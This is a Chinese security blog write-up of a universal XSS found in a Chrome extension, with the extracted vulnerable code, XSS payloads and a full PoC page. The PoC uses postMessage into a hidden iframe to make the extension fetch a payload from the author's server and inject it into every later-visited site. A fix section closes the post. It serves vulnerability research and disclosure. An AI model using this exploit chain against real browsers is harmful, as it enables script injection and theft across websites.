> 原文链接: https://www.anquanke.com//post/id/98917 


# Chrome 扩展安全研究: 一个UXSS的挖掘经历


                                阅读量   
                                **447772**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01e150faf8d13b5af3.jpg)](https://p1.ssl.qhimg.com/t01e150faf8d13b5af3.jpg)

> 本篇原创文章参加双倍稿费活动，预估稿费为600元，活动链接请点[此处](https://www.anquanke.com/post/id/98410)

## 引言

有点想把标题换成 &lt;Chrome 安全研究: 一个UXSS的挖掘经历&gt; 来骗一波点击。但毕竟其实是扩展的问题，还是老实点写“扩展”吧。

这是我春节前挖到的一个漏洞，大概抓取了用户量top400的 Chrome 扩展，对比较在意的几个问题写了脚本删选了一部分出来，再逐个审计。本次讲的这个漏洞是想产出 UXSS 的时候挖的 UXSS 漏洞之一。我觉得比较典型，涉及到 content_scripts 和 background 脚本及其他 Chrome 扩展的特性，相对来说比较有趣，坑也稍微多一点。

由于不能公开插件详情，我把该插件和漏洞相关的源码抽出来，去掉一些带有公司名的关键字，放到 github 上:

[https://github.com/neargle/hacking-extensions/tree/master/content_scripts_uxss](https://github.com/neargle/hacking-extensions/tree/master/content_scripts_uxss)

`git clone` 到本地，打开 chrome://extensions/， 开启“开发者模式”, 点击 “加载已解压的扩展程序…” 按钮，选择 content_scripts_uxss 文件夹即可。

[![](https://p0.ssl.qhimg.com/t01c468de71c3e4dbac.jpg)](https://p0.ssl.qhimg.com/t01c468de71c3e4dbac.jpg)

## manifest.json

manifest.json 是 Chrome 扩展的清单文件，Chrome 解析扩展时会检查这个文件的内容是否符合规范。审计也一般从这里开始：

```
`{`
    "name": "content_script_uxss_example",
    "description": "一个由原型修改而来会产生UXSS的Chrome插件",
    "version": "1.0",
    "manifest_version": 2,
    "background": `{`
        "scripts": [
            "/core/js/jquery.min.js",
            "/core/js/background.js"
        ]
    `}`,
    "author": "neargle@sec-news",
    "content_scripts": [
        `{`
            "matches": [
                "http://*/*",
                "https://*/*",
                "file:///*/*"
            ],
            "exclude_matches": [],
            "js": [
                "/core/js/jquery.min.js",
                "/core/js/content_script.js"
            ],
            "run_at": "document_end",
            "all_frames": true
        `}`
    ]
`}`
```

关注点在 background 和 content_scripts:
1. background 可以设置一个扩展创建时就一直在后台存在的页面，只有关闭扩展才会使这个页面绑定的事件失效，重启扩展或浏览器才可以使定义的全局变量重新定义（Mac 下 `command + Q`）。如果设置了 `page` 属性， 如 `"background":`{`"page": "background.html"`}``, 则这个文件就是该扩展的后台页面，可以访问 `chrome-extension://`{`扩展ID`}`/background.html` 进行调试，像本例中只设置了 scripts 属性的情况， 那么 Chrome 会自己生成这个 page 页面，地址在 `chrome-extension://`{`扩展ID`}`/_generated_background_page.html`。
1. content_scripts 可以设置多个， 每一次访问一个 url 符合 matches 的匹配条件且不符合 exclude_matches 里所写的排除条件时，会运行 “js” 里设置的脚本。 matches 可以使用 `&lt;all_urls&gt;` 匹配所有 url。”run_at” 设置的是 content_scripts 的运行时间， all_frames 为 true 的时候，页面中 iframe 内部的页面也会触发 content_scripts。
background 和 content_scripts 及我们所运行的原本的网页，都不在同一个运行时上下文内，里面定义的变量不可互相访问，每个 runtime 可以访问的 api 也有所不同。但可以使用 `window.addEventListener` 给原本页面的 window 添加事件，通过事件操作 DOM 结构，background 和 content_scripts 之间的相互作用也经常使用 `chrome.extension.onRequest.addListener` 或 `chrome.runtime.onMessage.addListener` 进行。



## content_scripts

最开始我注意点其实是 /core/js/content_script.js 中的第 [#68](https://github.com/neargle/hacking-extensions/blob/master/content_scripts_uxss/core/js/content_script.js#L68) 行的代码:

```
if (location.href.indexOf("?") &gt; 0) `{`
    var a = location.href.split("?")[1].split("&amp;");
    $(a).each(function() `{`
        var b = this.split("=");
        query[b[0]] = b[1]
    `}`)
`}`
```

一般插件内部使用的 jquery 版本不经常更新，该插件使用的 jquery 版本是 v1.7.1，存在如下漏洞:

[![](https://p5.ssl.qhimg.com/t010b799eabf6e15f26.jpg)](https://p5.ssl.qhimg.com/t010b799eabf6e15f26.jpg)

而 a 参数的值很显然是获取当前 url 的 GET 请求参数，如果它直接使用 `location.search`， 那么 Chrome 里面里面会进行 url 编码， 比较难以利用，但是这里的这种写法却是可以使用 hash 来 bypass 的，设置一个如 `#?&lt;img src=@ onerror=prompt()&gt;` 可以使得 `a=["&lt;img src=@ onerror=prompt()&gt;"]`, 例如 `https://www.baidu.com/#?&lt;img src=@ onerror=prompt()&gt;`。

但是，当 jquery 传入的选择器为数组的时候，该函数并不会触发漏洞， 如 `$(['&lt;img src=1 onerror=prompt()&gt;'])`。而且之后发现了更加有趣的 postmessage 接口，就把注意力转移到了接下来的代码上。

### <a class="reference-link" name="message%20%E4%BA%8B%E4%BB%B6"></a>message 事件

扩展内使用 message 事件的情况，并不少见，在我爬取的 top400 的扩展中，有将近 200 插件在 content_script 内对 window 添加了 message 监听事件，本例中也有 [content_script.js#L3](https://github.com/neargle/hacking-extensions/blob/master/content_scripts_uxss/core/js/content_script.js#L3):

```
window.addEventListener("message", function(a) `{`
if (a.data != undefined) `{`
    plugdata = a.data;
    if (plugdata.Action != undefined)
        if (plugdata.Action == "GETCOOKIE") chrome.extension.sendRequest(plugdata, function() `{``}`);
        else if (plugdata.Action != "VERSION") `{`
        if (plugdata.background == undefined || plugdata.background == false) $("#divDetail").html("&lt;br/&gt;&lt;center&gt;notifications with some message.&lt;/center&gt;");
        chrome.extension.sendRequest(plugdata, function() `{``}`)
    `}`
`}`
`}`);
```

这里的 a.data 就是 postMessage 第一个参数传入的值，例如我们用 `ww = window.open('https://www.google.com/');ww.postMessage("aaaaa", "*");` 发送一个message，那么这个 a.data 就等于 “aaaaa”。

可以发现，这段代码在判断了一下 data.Action 之后，就把 data 的值用 chrome.extension.sendRequest 发送了出去。这也是在浏览器插件里面经常出现的逻辑，因为正常的html页面并不能访问 chrome.extension 的api，如果需要发送信息到 `chrome.extension.onRequest.addListener` 或 `chrome.runtime.onMessage.addListener` 的回调函数内的话， 在 content_script 里面做一次中转也是经常采用的方法。

注意 content_script 有一个经常出现 domxss 输出函数 `html`:

```
chrome.extension.onRequest.addListener(function(a, b, c) `{`
switch (a.Action) `{`
    case "FAREResult":
    case "ONRESULT":
        typeof a.Data.Data === "string" ? $("#IRData").val(a.Data.Data) : $("#IRData").val(JSON.stringify(a.Data.Data));
        $("#Message").html(a.Data.Message);
        $("#Command").html(a.Data.Action);
        break;
`}`
`}`);
```

不过这里需要原本页面的 dom 结构里面包含一些条件，必须带有 #Message 和 #Command 两个id的html元素，显然并不是我们想要的。如果页面符合这个条件的话，我们就可以直接使用 `ww = window.open('https://www.google.com/');ww.postMessage(`{`"Action":"ONRESULT", "Message":"&lt;img src=1 onerror=prompt()&gt;"`}`, "*");` 即可造成跨到 google 域的xss攻击。

而 PerformAction 函数却有一个这样的输出，`$("body").html(b)`, 这显然就很通用了。

```
function PerformAction() `{`
if (plugdata != null) `{`
    var a = plugdata.Action;
    switch (plugdata.Method) `{`
        case "POST":
            $.post(plugdata.URL, plugdata.post, function(b) `{`
                if (plugdata.SetBodyText == true) try `{`
                    $("body").html(b)
                `}` catch (c) `{``}`
```

可是原本 plugdata 的定义就为 null, 怎么使其不为 null 进入条件呢？

```
$(document).ready(function() `{`

    ...

    $("#Version").html("5.10");
    chrome.extension.sendRequest(`{`
        Action: "ONLOAD"
    `}`, function(b) `{`
        plugdata = b;
        PerformAction()
    `}`);

`}`);
```

可以发现 PerformAction 调用之前有一个赋值，可以使用 `{`Action: “ONLOAD”`}` 对其进行赋值，而对 `{`Action: “ONLOAD”`}` 的响应，则在 background.js 内:

```
var RequestQ = [],
    plugdata = null,
    IRTab = null,
    IRData = null,
    requestFilter = `{`
        urls: ["&lt;all_urls&gt;"]
    `}`;

chrome.extension.onRequest.addListener(function(a, b, c) `{`
    $.extend(a, `{`
        TabID: b.tab.id
    `}`);
    plugdata = a;
    switch (a.Action) `{`
        case "VERSION":
            break;
        case "ONLOAD":
            c(IRData);
            break;
        case "GETFARE":
            IRData = a;
            $.extend(a, `{`
                RequesterTabID: b.tab.id
            `}`);
            chrome.tabs.getAllInWindow(null, OngetAllInWindow);
            c(`{``}`);
            break;
            ......
```

这里如果之前不了解 background_page 的特性的话是比较绝望的，因为对于 plugdata 的赋值来自于 chrome.extension.onRequest.addListener 的回调函数 c， 而 c 的参数则是 IRData 也为 null, 也就是说正常来讲 `plugdata = IRData = null`。 虽然我可以发送 `{`“Action”: “GETFARE”`}` 来设置 IRData 的值，但是如果 background_page 和 content_script 一样是每一次刷新页面执行一次的话，那就很尴尬了。因为PerformAction 的执行在 `$(document).ready(`, 我必须要要求页面过一段时间再执行 `$(document).ready(` 以求我能在 PerformAction 之前 postMessage 一个 `{`“Action”: “GETFARE”`}`，其实这里并不需要这样。 （当然这样的条件竞争也是可以达成的，让 `$(document).ready(` 等一段时间的方法也有很多，一个src地址返回比较慢的script标签就是一个方法）。



## background page

思考了一下 background page 的设计需求，我觉得它不应该像 content_script 一样每次访问页面执行一次。看了一些官方文档，并写了几个 demo，确定了以下两点：
1. background 并不是每次访问页面执行一次，内部定义的变量不会因为页面刷新而重新定义。
1. background 即使域改变也不会重新定义和赋值，所有的域都用一个 runtime。
第一点使得这个漏洞更加容易利用，第二点使得我们所写的 payload 并不只影响在 payload 中利用的网站，而是在浏览器和插件为重启之前，每次访问新的页面都可以在不同域下触发 payload。



## 利用

思路明确了之后，我们只需先 postmessage 一个 ``{`Action: "GETFARE",Data: `{`//payload看下面源码`}``}``， 把 IRData 设置为 Data 属性里的 payload， 再刷新页面使其重新执行 PerformAction 函数，PerformAction 会发送一个post请求到 plugdata.URL 上，并把返回传递到 `$("body").html(b)` 的 b 参数中。（重新设置 iframe 的 src 即可刷新页面）

ps. 由于最近p师傅的 note 神器，证书不能用了，我只能先用我自己没有认证的证书来，baidu 属于 https，要发送 ajax 请求，对象也必须得是 https. 且需要设置 Access-Control-Allow-Origin 和 Access-Control-Allow-Methods。 **请大家在访问poc前，先访问 [https://case.neargle.com](https://case.neargle.com) ，认证一下那个破证书**。

在插件已经启用的前提下打开以下链接链接即可，跨域到 www.baidu.com 执行 xss。且之后再访问任意网站 payload 都会执行。

poc: [https://blog.neargle.com/hacking-extensions/content_scripts_uxss/poc.html](https://blog.neargle.com/hacking-extensions/content_scripts_uxss/poc.html)

```
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt;
    &lt;title&gt;content script uxss poc&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

    &lt;h1&gt;hacking-extensions&lt;/h1&gt;
    &lt;p&gt;source code: &lt;a href="https://github.com/neargle/hacking-extensions/tree/master/content_scripts_uxss"&gt;https://github.com/neargle/hacking-extensions/tree/master/content_scripts_uxss&lt;/a&gt;&lt;/p&gt;

    &lt;!-- poc content --&gt;
    &lt;iframe src="https://www.baidu.com" style="display: none;"&gt;&lt;/iframe&gt;
    &lt;script&gt;
        subframe = frames[0];
        data = `{`
        Action: "GETFARE",
            Data: `{``}`
        `}`
        data.Method = "POST";
        data.URL = "https://case.neargle.com/payload/uxss_payload.php";
        data.SetBodyText = true;
        data.post = `{``}`;
        setTimeout('subframe.postMessage(data, "*")', 2000);

        setTimeout(function()`{`
            document.querySelector('iframe').src = "https://www.baidu.com";
        `}`, 3000);
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
```



## 视频演示

<video src="http://rs-beijing.oss.yunpan.360.cn/Object.getFile/anquanke/Y2hyb21lLWV4dC11eHNzLXZpZGVvLm1wNA==" style="width: 100%; height: auto;" controls="controls" width="100" height="100">﻿﻿<br>
您的浏览器不支持video标签<br></video>

首先访问 [https://blog.neargle.com/hacking-extensions/content_scripts_uxss/poc.html](https://blog.neargle.com/hacking-extensions/content_scripts_uxss/poc.html) 触发漏洞，在依次访问 [https://www.baidu.com/](https://www.baidu.com/) 和 [https://www.google.com/](https://www.google.com/) 证明第二个结论。



## 修复

修复方法有很多，最为常见的就是限定 postMessage 的 source 为当前 window，例如 `evt.source === window`，这个是大部分插件采用的方法，如 [React Developer Tools](https://chrome.google.com/webstore/detail/react-developer-tools/fmkadmapgofadopljbjfkapdkoienihi?hl=zh-CN) 的代码：

```
function handleMessageFromPage(evt) `{`
    evt.source === window &amp;&amp; evt.data &amp;&amp; "react-devtools-bridge" === evt.data.source &amp;&amp; port.postMessage(evt.data.payload);
`}`
```

当然这种防御方式也是可能被 bypass 并受到UXSS影响的，这里暂且不提。

这个插件的情况，其实功能只提供给部分网站，限定 event.origin, 只给部分网站提供该需求即可。例如: `event.origin === "https://baidu.com"。`



## 插件爬虫及其它

本次选取的插件，大概有 500000+ 用户(数据更新至2018年春节前)，国内使用的人数较少，大家不用担心受到影响。

使用的爬虫，是之前和蘑菇同学做的研究 &lt;Chrome 插件探针&gt; 遗留下来的一部分项目修改的，可以参考当时研究的paper: [https://mp.weixin.qq.com/s/HHPxGTk55oEw0Pj4TRg6FA](https://mp.weixin.qq.com/s/HHPxGTk55oEw0Pj4TRg6FA) 和 [https://github.com/neargle/ChromeExtensionKnower](https://github.com/neargle/ChromeExtensionKnower) 项目。



## 参考
- [https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
- [https://developer.chrome.com/apps/getstarted](https://developer.chrome.com/apps/getstarted)
- [https://domstorm.skepticfx.com/modules/?id=5739f797c9e0250300990938](https://domstorm.skepticfx.com/modules/?id=5739f797c9e0250300990938)
- [https://github.com/neargle/tips-note/tree/master/postMessage_and_addEventListener_message](https://github.com/neargle/tips-note/tree/master/postMessage_and_addEventListener_message)